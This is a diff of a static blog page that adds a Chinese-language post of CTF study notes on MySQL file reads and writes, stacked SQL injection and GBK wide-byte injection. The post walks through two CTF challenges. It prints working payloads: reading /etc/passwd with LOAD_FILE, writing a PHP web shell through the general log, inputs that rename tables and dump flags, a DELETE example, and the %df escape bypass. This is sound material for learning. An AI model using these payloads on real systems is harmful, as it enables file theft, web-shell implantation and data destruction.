@@ -71,6 +71,101 @@
       <div class="outer">
         <section id="main">
   
+    <article id="post-06文件堆叠宽字节" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2022/03/05/06%E6%96%87%E4%BB%B6%E5%A0%86%E5%8F%A0%E5%AE%BD%E5%AD%97%E8%8A%82/" class="article-date">
+  <time class="dt-published" datetime="2022-03-05T10:17:19.000Z" itemprop="datePublished">2022-03-05</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/2022/03/05/06%E6%96%87%E4%BB%B6%E5%A0%86%E5%8F%A0%E5%AE%BD%E5%AD%97%E8%8A%82/">文件堆叠宽字节</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+       
+        <p>[TOC]</p>
+<h1 id="一、文件操作"><a href="#一、文件操作" class="headerlink" title="一、文件操作"></a>一、文件操作</h1><h2 id="1、MySQL变量"><a href="#1、MySQL变量" class="headerlink" title="1、MySQL变量"></a>1、MySQL变量</h2><p>（1）mysqld服务器维护两种变量。<strong>全局变量</strong>影响服务器的全局操作。<strong>会话变量</strong>影响具体客户端连接相关操作。</p>
+<p>（2）可以通过SHOW VARIABLES语句查看系统变量及其值。</p>
+<p>  mysql&gt; SHOW VARIABLES;</p>
+<p>  可以使用like语句来匹配和筛选</p>
+<p>（3）secure_file_priv</p>
+<p>secure_file_priv对<strong>读写文件</strong>有影响。<br>secure-file-priv参数是用来限制LOAD DATA, SELECT … OUTFILE, and LOAD_FILE()传到哪个指定目录的。<br>当secure_file_priv的值为<strong>null</strong> ，表示限制mysqld 不允许导入|导出。默认是null<br>当secure_file_priv的值为**/tmp/** ，表示限制mysqld 的导入|导出只能发生在/tmp/目录下<br><strong>当secure_file_priv的值没有具体值时，表示不对mysqld 的导入|导出做限制</strong></p>
+<p><img src="/2022/03/05/06%E6%96%87%E4%BB%B6%E5%A0%86%E5%8F%A0%E5%AE%BD%E5%AD%97%E8%8A%82/1.png" alt="1"></p>
+<h2 id="2、Mysql读文件"><a href="#2、Mysql读文件" class="headerlink" title="2、Mysql读文件"></a>2、Mysql读文件</h2><p>Select load_file(‘/flag’);</p>
+<p>SELECT CONVERT(LOAD_FILE(“/etc/passwd”) USING utf8);</p>
+<h2 id="3、Mysql写文件"><a href="#3、Mysql写文件" class="headerlink" title="3、Mysql写文件"></a>3、Mysql写文件</h2><p>select “<?php phpinfo();?>“ into outfile “/tmp/1.php”;<br>select “<?php phpinfo();?>“ into dumpfile “/tmp/1.php”;</p>
+<p>outfile函数可以导出多行，而dumpfile只能导出一行数据<br>outfile函数在将数据写到文件里时有特殊的格式转换，而dumpfile则保持原数据格式</p>
+<p>eg:</p>
+<p>select ‘a\naa\raaaa’ into outfile ‘/tmp/test1.txt’;<br>select ‘a\naa\raaaa’ into dumpfile ‘/tmp/test2.txt’;</p>
+<h1 id="二、堆叠注入"><a href="#二、堆叠注入" class="headerlink" title="二、堆叠注入"></a>二、堆叠注入</h1><h2 id="1、当secure-file-priv为NULL"><a href="#1、当secure-file-priv为NULL" class="headerlink" title="1、当secure_file_priv为NULL"></a>1、当secure_file_priv为NULL</h2><p>set global general_log=on;<br>set global general_log_file=’C:/phpStudy/WWW/789.php’;<br>select ‘<?php eval($_POST['a']) ?>‘;</p>
+<h2 id="2、MySQL可以执行多条语句，多条语句之前用-做分隔"><a href="#2、MySQL可以执行多条语句，多条语句之前用-做分隔" class="headerlink" title="2、MySQL可以执行多条语句，多条语句之前用;做分隔"></a>2、MySQL可以执行多条语句，多条语句之前用;做分隔</h2><p>  （1）简单的说，由于分号;为MYSQL语句的结束符。若在支持多语句执行的情况下，可利用此方法<br>  执行其他恶意语句，如RENAME、DROP等， <strong>堆 叠 注 入 可 以 用 于 执 行 任 何 SQL 语 句</strong> </p>
+<p>（2）条件<br>$mysqli-&gt;multi_query($sql);</p>
+<p>（3）执行查询时，第一个语句执行信息查询，第二个语句则将表user的所有内容给删除了：</p>
+<p>mysql&gt; select * from users where id =1;delete from users;</p>
+<p>（4）堆叠注入并不是在每种情况下都能使用的。大多数时候，因为API或数据库引擎的不支持，堆叠注入都无法实现</p>
+<p>条件 $mysqli-&gt;multi_query($sql);</p>
+<p>（5）注意，通常多语句执行时，若前条语句已返回数据，则之后的语句返回的数据通常无法返回前端页面。建议使用<strong>union联合注入</strong>，若无法使用联合注入， 可考虑使用<strong>RENAME</strong>关键字，将想要的数据列名/表名更改成返回数据的SQL语句所定义的表/列名 </p>
+<p><strong>eg：强网杯2019随便注</strong></p>
+<h2 id="3、过滤了select"><a href="#3、过滤了select" class="headerlink" title="3、过滤了select"></a>3、过滤了select</h2><p>(以随便注为例)</p>
+<p>（1）输入select发现被过滤：<br><img src="/2022/03/05/06%E6%96%87%E4%BB%B6%E5%A0%86%E5%8F%A0%E5%AE%BD%E5%AD%97%E8%8A%82/2.png" alt="2"></p>
+<p>（2）mysql除可使用select查询表中的数据，也可使用<strong>handler</strong>语句，这条语句使我们能够一行一行的浏览一个表中的数据，不过handler语句并不具备select语句的所有功能。它是mysql专用的语句，并没有包含到SQL标准中</p>
+<p>（3）语句调用：</p>
+<p>handler users open as hd; #指定数据表进行载入并将返回句柄重命名<br>handler hd read first; #读取指定表/句柄的首行数据<br>handler hd read next; #读取指定表/句柄的下一行数据<br>handler hd close; #关闭句柄</p>
+<p><img src="/2022/03/05/06%E6%96%87%E4%BB%B6%E5%A0%86%E5%8F%A0%E5%AE%BD%E5%AD%97%E8%8A%82/3.png" alt="3"></p>
+<p>（4）<strong>法一：</strong></p>
+<p>输入1’;show tables;#即可查看表</p>
+<p>再输入：’;handler <code>1919810931114514</code> open;handler <code>1919810931114514</code> read first#即可得出flag。</p>
+<p><strong>法二：</strong>（进行修改）</p>
+<p>1）输入：1’;show columns from <code>words</code>;#</p>
+<p><img src="/2022/03/05/06%E6%96%87%E4%BB%B6%E5%A0%86%E5%8F%A0%E5%AE%BD%E5%AD%97%E8%8A%82/4.png" alt="4"></p>
+<p>所以我们可以这样猜测：</p>
+<p>select * from words where id = ‘$id’;我们所输入的就是这个id。</p>
+<p>2）输入以下代码对其进行修改：</p>
+<p>1’;RENAME TABLE <code>words</code> TO <code>words2</code>;RENAME TABLE <code>1919810931114514</code> TO <code>words</code>;ALTER TABLE <code>words</code> CHANGE <code>flag</code> <code>id</code> VARCHAR(100) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL;#</p>
+<p>原本：select * from words where id = ‘$id’;修改后等同于：</p>
+<p><strong>select * from 1919810931114514 where flag = ‘$id’;</strong></p>
+<p>此时输入：1’ or 1=1;#即可得出flag。</p>
+<p><img src="/2022/03/05/06%E6%96%87%E4%BB%B6%E5%A0%86%E5%8F%A0%E5%AE%BD%E5%AD%97%E8%8A%82/5.png" alt="5"></p>
+<p><strong>法三：</strong>利用mysql预处理</p>
+<p>1’;PREPARE st from concat(‘s’,’elect’, ‘ * from <code>1919810931114514</code><br>‘);EXECUTE st;#</p>
+<h1 id="三、宽字节注入基础"><a href="#三、宽字节注入基础" class="headerlink" title="三、宽字节注入基础"></a>三、宽字节注入基础</h1><h2 id="1、字符集："><a href="#1、字符集：" class="headerlink" title="1、字符集："></a>1、字符集：</h2><p>  字符集也叫字符编码，是一种将符号转换为二进制数的映射关系。<br>  几种常见的字符集：<br>  ASCII编码：单字节编码<br>  latin1编码：单字节编码<br>  gbk编码：使用一字节和双字节编码，0x00-0x7F范围内是一位，和 ASCII 保持一致。双字节的第一字节范围是0x81-0xFE<br>  UTF-8编码：使用一至四字节编码，0x00–0x7F范围内是一位，和 ASCII 保持一致。其它字符用二至四个字节变长表示。</p>
+<h2 id="2、宽字节注入基础"><a href="#2、宽字节注入基础" class="headerlink" title="2、宽字节注入基础"></a>2、宽字节注入基础</h2><p>（1）宽字节就是两个以上的字节，宽字节注入产生的原因就是<strong>各种字符编码的不当操作，使得攻击者可以通过宽字节编码绕过SQL注入防御</strong></p>
+<p>（2）通常来说，一个gbk编码汉字，占用2个字节。一个utf-8编码的汉字，占用3个字节。在php中，我们可以通过输出echo strlen(“和”);来测试</p>
+<p><img src="/2022/03/05/06%E6%96%87%E4%BB%B6%E5%A0%86%E5%8F%A0%E5%AE%BD%E5%AD%97%E8%8A%82/6.png" alt="6"></p>
+<p>  当将页面编码保存为gbk时输出2，utf-8时输出3。<br>  除了gbk以外，所有ANSI编码都是2个字节。ANSI只是一个标准，在不同的电脑上它代表的编码可能不相同，比如简体中文系统中ANSI就代表是GBK。</p>
+<h2 id="3、转义"><a href="#3、转义" class="headerlink" title="3、转义"></a>3、转义</h2><p>eg1：</p>
+<p>用户名输入：admin’ or 1=1#<br>转义后为： admin&#39; or 1=1#<br>执行语句：… where username=’admin&#39; or 1=1#’</p>
+<p>eg2：</p>
+<p>用户名输入：admin%df’ or 1=1#<br>转义后为： admin%df&#39; or 1=1#<br>SET character_set_client =’gbk’后：admin運’ or 1=1#<br>执行语句：… where username=’admin運’ or 1=1#’</p>
+<p>题目：GXYCTF2019 BabySqli v2.0</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2022/03/05/06%E6%96%87%E4%BB%B6%E5%A0%86%E5%8F%A0%E5%AE%BD%E5%AD%97%E8%8A%82/" data-id="cl0dstj3l0000awv1bz998eob" data-title="文件堆叠宽字节" class="article-share-link">Share</a>
+      
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+
+
+
+  
     <article id="post-05联合查询" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
   <div class="article-meta">
     <a href="/2022/03/05/05%E8%81%94%E5%90%88%E6%9F%A5%E8%AF%A2/" class="article-date">
@@ -547,6 +642,10 @@
       <ul>
         
           <li>
+            <a href="/2022/03/05/06%E6%96%87%E4%BB%B6%E5%A0%86%E5%8F%A0%E5%AE%BD%E5%AD%97%E8%8A%82/">文件堆叠宽字节</a>
+          </li>
+        
+          <li>
             <a href="/2022/03/05/05%E8%81%94%E5%90%88%E6%9F%A5%E8%AF%A2/">联合查询</a>
           </li>
         
@@ -560,10 +659,6 @@
         
           <li>
             <a href="/2022/03/04/%E5%BC%B1%E7%B1%BB%E5%9E%8B%E5%8F%8A%E5%93%88%E5%B8%8C%E7%BB%95%E8%BF%87/">弱类型及哈希绕过</a>
-          </li>
-        
-          <li>
-            <a href="/2021/11/25/PHP%E8%AF%AD%E6%B3%95%E5%92%8C%E5%8F%98%E9%87%8F/">PHP语法和变量</a>
           </li>
         
       </ul>
